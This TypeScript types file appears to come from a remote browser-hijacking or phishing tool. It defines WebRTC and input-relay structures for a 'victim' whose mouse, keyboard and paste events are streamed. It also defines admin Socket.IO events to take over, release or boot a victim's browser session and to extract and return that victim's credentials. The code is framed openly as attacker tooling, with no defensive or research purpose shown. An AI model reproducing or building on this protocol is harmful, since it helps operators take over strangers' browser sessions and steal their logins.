// WebRTC types from DOM lib
export type RTCSessionDescriptionInit = {
  type?: RTCSdpType;
  sdp?: string;
};

export type RTCIceCandidateInit = {
  candidate?: string;
  sdpMLineIndex?: number | null;
  sdpMid?: string | null;
  usernameFragment?: string | null;
};

type RTCSdpType = 'offer' | 'answer' | 'pranswer' | 'rollback';

export interface InputEvent {
  type: 'mousedown' | 'mouseup' | 'mousemove' | 'click' | 'mousewheel' | 'keydown' | 'keyup' | 'paste';
  sessionId: string;
  data: MouseEventData | KeyboardEventData | PasteEventData | WheelEventData;
  timestamp: number;
}

export interface MouseEventData {
  clientX: number;
  clientY: number;
  button?: number | string; // Accept both numeric (0,1,2) and string ('left','middle','right')
}

export interface KeyboardEventData {
  key: string;
  code?: string;
  shiftKey?: boolean;
  ctrlKey?: boolean;
  altKey?: boolean;
  metaKey?: boolean;
}

export interface WheelEventData {
  deltaX: number;
  deltaY: number;
  deltaZ?: number;
}

export interface PasteEventData {
  text: string;
}

// Socket.IO Event Types
export interface SocketEvents {
  // Victim events
  'victim:connect': { viewport: { width: number; height: number }; ip: string };
  'victim:input': InputEvent;
  'victim:webrtc:offer': { browserId: string; offer: RTCSessionDescriptionInit };
  'victim:webrtc:answer': { browserId: string; answer: RTCSessionDescriptionInit };
  'victim:webrtc:candidate': { browserId: string; candidate: RTCIceCandidateInit };

  // Browser events
  'browser:ready': { browserId: string };
  'browser:webrtc:offer': { viewerId: string; offer: RTCSessionDescriptionInit };
  'browser:webrtc:answer': { viewerId: string; answer: RTCSessionDescriptionInit };
  'browser:webrtc:candidate': { viewerId: string; candidate: RTCIceCandidateInit };
  'browser:thumbnail': { browserId: string; image: string };

  // Admin events
  'admin:session:list': unknown;
  'admin:session:takeover': { browserId: string; viewport: { width: number; height: number } };
  'admin:session:release': { browserId: string };
  'admin:session:boot': { browserId: string };
  'admin:credentials:extract': { browserId: string };
  'admin:credentials:result': { browserId: string; credentials: unknown };
}

